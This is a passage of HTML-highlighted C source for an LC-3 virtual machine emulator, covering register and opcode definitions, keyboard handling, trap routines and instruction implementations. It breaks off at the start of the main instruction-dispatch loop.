class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Includes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Registers */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    R_R0 = <span class="number">0</span>,</span><br><span class="line">    R_R1,</span><br><span class="line">    R_R2,</span><br><span class="line">    R_R3,</span><br><span class="line">    R_R4,</span><br><span class="line">    R_R5,</span><br><span class="line">    R_R6,</span><br><span class="line">    R_R7,</span><br><span class="line">    R_PC, </span><br><span class="line">    R_COND,</span><br><span class="line">    R_COUNT</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Condition Flags */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FL_POS = <span class="number">1</span> &lt;&lt; <span class="number">0</span>, </span><br><span class="line">    FL_ZRO = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, </span><br><span class="line">    FL_NEG = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Opcodes */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    OP_BR = <span class="number">0</span>, </span><br><span class="line">    OP_ADD,    </span><br><span class="line">    OP_LD,     </span><br><span class="line">    OP_ST,     </span><br><span class="line">    OP_JSR,   </span><br><span class="line">    OP_AND,    </span><br><span class="line">    OP_LDR,    </span><br><span class="line">    OP_STR,  </span><br><span class="line">    OP_RTI,    </span><br><span class="line">    OP_NOT,   </span><br><span class="line">    OP_LDI,   </span><br><span class="line">    OP_STI,    </span><br><span class="line">    OP_JMP,    </span><br><span class="line">    OP_RES,    </span><br><span class="line">    OP_LEA,    </span><br><span class="line">    OP_TRAP   </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory Mapped Registers */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    MR_KBSR = <span class="number">0xFE00</span>, </span><br><span class="line">    MR_KBDR = <span class="number">0xFE02</span>  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TRAP Codes */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    TRAP_GETC = <span class="number">0x20</span>,  </span><br><span class="line">    TRAP_OUT = <span class="number">0x21</span>,   </span><br><span class="line">    TRAP_PUTS = <span class="number">0x22</span>,  </span><br><span class="line">    TRAP_IN = <span class="number">0x23</span>,    </span><br><span class="line">    TRAP_PUTSP = <span class="number">0x24</span>, </span><br><span class="line">    TRAP_HALT = <span class="number">0x25</span>   </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory Storage */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMORY_MAX (1 &lt;&lt; 16)</span></span><br><span class="line"><span class="keyword">uint16_t</span> memory[MEMORY_MAX];  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register Storage */</span></span><br><span class="line"><span class="keyword">uint16_t</span> reg[R_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Input Buffering */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">original_tio</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disable_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tcgetattr(STDIN_FILENO, &amp;original_tio);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">new_tio</span> =</span> original_tio;</span><br><span class="line">    new_tio.c_lflag &amp;= ~ICANON &amp; ~ECHO;</span><br><span class="line">    tcsetattr(STDIN_FILENO, TCSANOW, &amp;new_tio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">restore_input_buffering</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    tcsetattr(STDIN_FILENO, TCSANOW, &amp;original_tio);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">check_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd_set readfds;</span><br><span class="line">    FD_ZERO(&amp;readfds);</span><br><span class="line">    FD_SET(STDIN_FILENO, &amp;readfds);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span>;</span></span><br><span class="line">    timeout.tv_sec = <span class="number">0</span>;</span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> select(<span class="number">1</span>, &amp;readfds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Handle Interrupt */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_interrupt</span><span class="params">(<span class="keyword">int</span> signal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    restore_input_buffering();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sign Extend */</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">sign_extend</span><span class="params">(<span class="keyword">uint16_t</span> x, <span class="keyword">int</span> bit_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((x &gt;&gt; (bit_count - <span class="number">1</span>)) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        x |= (<span class="number">0xFFFF</span> &lt;&lt; bit_count);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Swap */</span></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">swap16</span><span class="params">(<span class="keyword">uint16_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; <span class="number">8</span>) | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Update Flags */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_flags</span><span class="params">(<span class="keyword">uint16_t</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reg[r] == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_ZRO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reg[r] &gt;&gt; <span class="number">15</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_NEG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_COND] = FL_POS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read Image File */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_image_file</span><span class="params">(FILE* file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> origin;</span><br><span class="line">    fread(&amp;origin, <span class="keyword">sizeof</span>(origin), <span class="number">1</span>, file);</span><br><span class="line">    origin = swap16(origin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> max_read = MEMORY_MAX - origin;</span><br><span class="line">    <span class="keyword">uint16_t</span>* p = memory + origin;</span><br><span class="line">    <span class="keyword">size_t</span> read = fread(p, <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>), max_read, file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (read-- &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *p = swap16(*p);</span><br><span class="line">        ++p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read Image */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_image</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* image_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* file = fopen(image_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;;</span><br><span class="line">    read_image_file(file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory Access */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_write</span><span class="params">(<span class="keyword">uint16_t</span> address, <span class="keyword">uint16_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    memory[address] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">mem_read</span><span class="params">(<span class="keyword">uint16_t</span> address)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (address == MR_KBSR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_key())</span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = (<span class="number">1</span> &lt;&lt; <span class="number">15</span>);</span><br><span class="line">            memory[MR_KBDR] = getchar();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            memory[MR_KBSR] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memory[address];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Key instructions */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ADD</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (imm_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1F</span>, <span class="number">5</span>);</span><br><span class="line">        reg[r0] = reg[r1] + imm5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">        reg[r0] = reg[r1] + reg[r2];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LDI</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">    reg[r0] = mem_read(mem_read(reg[R_PC] + pc_offset));</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RTI</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RES</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AND</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> imm_flag = (instr &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (imm_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> imm5 = sign_extend(instr &amp; <span class="number">0x1F</span>, <span class="number">5</span>);</span><br><span class="line">        reg[r0] = reg[r1] &amp; imm5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> r2 = instr &amp; <span class="number">0x7</span>;</span><br><span class="line">        reg[r0] = reg[r1] &amp; reg[r2];</span><br><span class="line">    &#125;</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NOT</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line"></span><br><span class="line">    reg[r0] = ~reg[r1];</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BR</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">uint16_t</span> cond_flag = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">if</span> (cond_flag &amp; reg[R_COND])</span><br><span class="line">    &#123;</span><br><span class="line">        reg[R_PC] += pc_offset;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JMP</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    reg[R_PC] = reg[r1];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">JSR</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> long_flag = (instr &gt;&gt; <span class="number">11</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    reg[R_R7] = reg[R_PC];</span><br><span class="line">    <span class="keyword">if</span> (long_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> long_pc_offset = sign_extend(instr &amp; <span class="number">0x7FF</span>, <span class="number">11</span>);</span><br><span class="line">        reg[R_PC] += long_pc_offset;  <span class="comment">/* JSR */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">        reg[R_PC] = reg[r1]; <span class="comment">/* JSRR */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LD</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    reg[r0] = mem_read(reg[R_PC] + pc_offset);</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LDR</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">    reg[r0] = mem_read(reg[r1] + offset);</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LEA</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    reg[r0] = reg[R_PC] + pc_offset;</span><br><span class="line">    update_flags(r0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ST</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    mem_write(reg[R_PC] + pc_offset, reg[r0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STI</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1FF</span>, <span class="number">9</span>);</span><br><span class="line">    mem_write(mem_read(reg[R_PC] + pc_offset), reg[r0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STR</span><span class="params">(<span class="keyword">uint16_t</span> instr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    <span class="keyword">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">    mem_write(reg[r1] + offset, reg[r0]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TRAP</span><span class="params">(<span class="keyword">uint16_t</span> instr,<span class="keyword">int</span> *running)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span>* c;</span><br><span class="line">    reg[R_R7] = reg[R_PC];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (instr &amp; <span class="number">0xFF</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> TRAP_GETC:</span><br><span class="line">        &#123;</span><br><span class="line">            reg[R_R0] = (<span class="keyword">uint16_t</span>)getchar();</span><br><span class="line">            update_flags(R_R0);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> TRAP_OUT:</span><br><span class="line">        &#123;</span><br><span class="line">            putc((<span class="keyword">char</span>)reg[R_R0], <span class="built_in">stdout</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> TRAP_PUTS:</span><br><span class="line">        &#123;</span><br><span class="line">            c = memory + reg[R_R0];</span><br><span class="line">            <span class="keyword">while</span> (*c)</span><br><span class="line">            &#123;</span><br><span class="line">                putc((<span class="keyword">char</span>)*c, <span class="built_in">stdout</span>);</span><br><span class="line">                ++c;</span><br><span class="line">            &#125;</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> TRAP_IN:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Enter a character: &quot;</span>);</span><br><span class="line">            <span class="keyword">char</span> ch = getchar();</span><br><span class="line">            putc(ch, <span class="built_in">stdout</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            reg[R_R0] = (<span class="keyword">uint16_t</span>)ch;</span><br><span class="line">            update_flags(R_R0);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> TRAP_PUTSP:</span><br><span class="line">        &#123;</span><br><span class="line">            c = memory + reg[R_R0];</span><br><span class="line">            <span class="keyword">while</span> (*c)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">char</span> char1 = (*c) &amp; <span class="number">0xFF</span>;</span><br><span class="line">                putc(char1, <span class="built_in">stdout</span>);</span><br><span class="line">                <span class="keyword">char</span> char2 = (*c) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                <span class="keyword">if</span> (char2) putc(char2, <span class="built_in">stdout</span>);</span><br><span class="line">                ++c;</span><br><span class="line">            &#125;</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> TRAP_HALT:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;HALT&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            *running = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Main Loop */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;lc3 [image-file1] ...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; argc; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!read_image(argv[j]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;failed to load image: %s\n&quot;</span>, argv[j]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGINT, handle_interrupt);</span><br><span class="line">    disable_input_buffering();</span><br><span class="line">    </span><br><span class="line">    reg[R_COND] = FL_ZRO;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> PC_START = <span class="number">0x3000</span> &#125;;</span><br><span class="line">    reg[R_PC] = PC_START;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> running = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (running)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint16_t</span> instr = mem_read(reg[R_PC]++);</span><br><span class="line">        <span class="keyword">uint16_t</span> op = instr &gt;&gt; <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> OP_ADD:</span><br><span class="line">                